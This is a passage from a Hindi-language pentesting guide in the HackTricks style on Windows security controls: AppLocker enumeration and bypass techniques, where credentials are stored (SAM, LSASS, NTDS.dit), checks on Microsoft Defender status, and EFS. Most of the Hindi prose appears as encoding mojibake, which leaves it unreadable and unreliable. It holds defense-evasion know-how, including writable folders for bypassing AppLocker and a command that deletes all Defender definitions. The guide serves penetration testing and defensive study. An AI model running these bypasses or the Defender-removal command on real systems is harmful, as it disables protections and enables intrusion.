# Windows рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ**ред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker рдиреАрддрд┐

рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдПрдХ рдЕрдиреБрдореЛрджрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдПрдХреНрдЬрд╝реАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рдХреА рд╕реВрдЪреА рд╣реЛрддреА рд╣реИ рдЬреЛ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдореМрдЬреВрдж рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдореИрд▓рд╡реЗрдпрд░ рдФрд░ рдЕрдиреБрдореЛрджрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрд╛ рдЬрд╛рдП рдЬреЛ рд╕рдВрдЧрдарди рдХреА рд╡рд┐рд╢реЗрд╖ рд╡реНрдпрд╛рдкрд╛рд░ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИред

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХрд╛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди** рд╣реИ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреМрди рд╕реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдПрдХреНрдЬрд╝реАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕, рд╕реНрдХреНрд░рд┐рдкреНрдЯ, Windows рд╕реНрдерд╛рдкрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ, DLLs, рдкреИрдХреЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдРрдкреНрд╕ рдФрд░ рдкреИрдХреЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдРрдкреНрд╕ рд╕реНрдерд╛рдкрдХреЛрдВ рдкрд░ **рд╕реВрдХреНрд╖реНрдо рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рд╕рдВрдЧрдардиреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ **cmd.exe рдФрд░ PowerShell.exe** рдФрд░ рдХреБрдЫ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд▓реЗрдЦрдХ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХреЗрдВ, **рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕рднреА рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

### рдЬрд╛рдВрдЪреЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ/рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ/рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХреА рдЧрдИ рд╣реИрдВ:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
рдПрдХ рд╣реЛрд╕реНрдЯ рдкрд░ рд▓рд╛рдЧреВ рдПрдкрд▓реЙрдХрд░ рдирд┐рдпрдо рднреА **рд╕реНрдерд╛рдиреАрдп рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ рдкрдврд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`** рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

### рдмрд╛рдИрдкрд╛рд╕

* рдПрдкрд▓реЙрдХрд░ рдиреАрддрд┐ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░**: рдпрджрд┐ рдПрдкрд▓реЙрдХрд░ рдХреЛ `C:\Windows\System32` рдпрд╛ `C:\Windows` рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** [**"LOLBAS's"**](https://lolbas-project.github.io/) рдмрд╛рдЗрдирд░реА рднреА AppLocker рдХреЛ рджреМрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
* **рдмреБрд░реА рддрд░рд╣ рд╕реЗ рд▓рд┐рдЦреА рдЧрдИ рдирд┐рдпрдореЛрдВ рдХреЛ рднреА рджреМрд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, рдЖрдк рдХрд╣реАрдВ рднреА рдПрдХ **`allowed`** рдирд╛рдордХ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреАред
* рд╕рдВрдЧрдарди рдЕрдХреНрд╕рд░ **`%System32%\WindowsPowerShell\v1.0\powershell.exe` рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ** рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡реЗ **рдЕрдиреНрдп** [**PowerShell рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕реНрдерд╛рди**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) рдЬреИрд╕реЗ `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` рдпрд╛ `PowerShell_ISE.exe` рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреВрд▓ рдЬрд╛рддреЗ рд╣реИрдВред
* **DLL рдкреНрд░рд╡рд░реНрддрди рдмрд╣реБрдд рд╣реА рдХрдо рдмрд╛рд░ рдЪрд╛рд▓реВ рд╣реЛрддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рднрд╛рд░ рдЖ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд░реАрдХреНрд╖рдг рдХреА рдорд╛рддреНрд░рд╛ред рдЗрд╕рд▓рд┐рдП **DLL рдХреЛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ AppLocker рдХреЛ рджреМрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓реЗрдЧреА**ред
* рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **Powershell рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ AppLocker рдХреЛ рджреМрд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрдЧреНрд░рд╣рдг

### рд╕реБрд░рдХреНрд╖рд╛ рдЦрд╛рддрд╛ рдкреНрд░рдмрдВрдзрдХ (SAM)

рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВ, рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

### рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) - LSASS

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг** (рд╣реИрд╢ рдХрд┐рдП рдЧрдП) рдЗрд╕ рд╕рдмрд╕рд┐рд╕реНрдЯрдо рдХреА **рдореЗрдореЛрд░реА** рдореЗрдВ **рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ** рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдПред\
**LSA** рд╕реНрдерд╛рдиреАрдп **рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐** (рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ...) рдХрд╛ рдкреНрд░рд╢рд╛рд╕рди рдХрд░рддрд╛ рд╣реИ, **рдкреНрд░рдорд╛рдгреАрдХрд░рдг**, **рдкрд╣реБрдБрдЪ рдЯреЛрдХрди**...\
LSA рд╣реА рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ **SAM** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ (рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП) рдФрд░ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдорд╛рдгрд┐рддрд┐ рдХреЗ рд▓рд┐рдП **рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ** рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░реЗрдЧрд╛ред

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг** **рдкреНрд░рдХреНрд░рд┐рдпрд╛ LSASS** рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ: Kerberos рдЯрд┐рдХрдЯ, NT рдФрд░ LM рд╣реИрд╢, рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкрд╛рд╕рд╡рд░реНрдбред

### LSA рдЧреБрдкреНрдд

LSA рдбрд┐рд╕реНрдХ рдореЗрдВ рдХреБрдЫ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд╣реЗрдЬ рд╕рдХрддрд╛ рд╣реИ:

* рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб (рдЕрдкреНрд░рд╛рдкреНрдп рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ)ред
* рд╡рд┐рдВрдбреЛрдЬ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб
* рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб
* рдЕрдзрд┐рдХ (IIS рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб...)

### NTDS.dit

рдпрд╣ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИред

## рд░рдХреНрд╖рдХ

[**рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд░рдХреНрд╖рдХ**](https://en.wikipedia.org/wiki/Microsoft\_Defender) рд╡рд┐рдВрдбреЛрдЬ 10 рдФрд░ рд╡рд┐рдВрдбреЛрдЬ 11 рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдПрдХ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╣реИ, рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рднреА рд╣реИред рдпрд╣ **`WinPEAS`** рдЬреИрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ **рдмреНрд▓реЙрдХ** рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджреМрд░рд╛ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВред

### рдЬрд╛рдВрдЪ

рд░рдХреНрд╖рдХ рдХреА **рд╕реНрдерд┐рддрд┐** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк PS cmdlet **`Get-MpComputerStatus`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП **`RealTimeProtectionEnabled`** рдХреЗ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо)

EFS рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрд▓реНрдХ **рд╕рдордорд┐рддрд┐ рдХреБрдВрдЬреА** рджреНрд╡рд╛рд░рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдпрд╛ **FEK** рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред FEK рдлрд┐рд░ рдПрдХ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИ, рдФрд░ рдЗрд╕ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб FEK рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓ рдХреЗ $EFS **рд╡реИрдХрд▓реНрдкрд┐рдХ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, EFS рдХрдВрдкреЛрдиреЗрдВрдЯ рдбреНрд░рд╛рдЗрд╡рд░ $EFS рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕рдордорд┐рддрд┐ рдХреБрдВрдЬреА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EFS рдбрд┐рдЬрд┐рдЯрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ (рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред [рдпрд╣рд╛рдВ рд╕реЗ](https://en.wikipedia.org/wiki/Encrypting\_File\_System)ред

рдЗрд╕ рддрд░рд╣ рдХреЗ рдЙрджрд╛рд╣рд░рдг:

* рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ FAT32 рдЬреИрд╕реЗ рджреВрд╕рд░реЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдлреЙрд░реНрдореЗрдЯ рдХрд┐рдП рдЧрдП рд╡реЙрд▓реНрдпреВрдо рдкрд░ рдХреЙрдкреА рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЬреИрд╕реЗ [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)ред
* рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ SMB/CIFS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдкреА рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдлрд╝рд╛рдЗрд▓реЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВред

рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ **рдорд╛рд▓рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рджрд░реНрд╢реА рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ** (рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдЙрдиреНрд╣реЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рд╣реИ), рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдмрди рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдмрджрд▓рдиреЗ рдФрд░ рдЙрд╕рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛)ред

### EFS рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ

